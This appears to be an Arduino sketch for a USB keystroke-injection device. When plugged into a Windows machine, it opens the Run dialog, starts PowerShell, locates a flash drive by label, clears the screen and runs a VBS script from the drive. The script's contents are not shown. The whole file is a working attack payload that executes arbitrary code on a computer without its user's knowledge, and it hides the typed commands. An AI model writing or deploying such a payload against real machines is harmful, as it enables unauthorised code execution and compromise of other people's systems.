
/*
 * this code runs a script located in the removable storage
*/

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  payload();

}

void loop() {
  // nothing here
}

void payload(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(1500);    // wait for powershell to launch. If it doesn't launch in time, the next keystrokes will be useless
  Keyboard.print("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'NAME' } | select name"); // change NAME to your flash name
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  Keyboard.print("cd $usbPath.name");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  Keyboard.print("clear");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  Keyboard.print("cscript scrpit.vbs");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(1000);
  
  
}
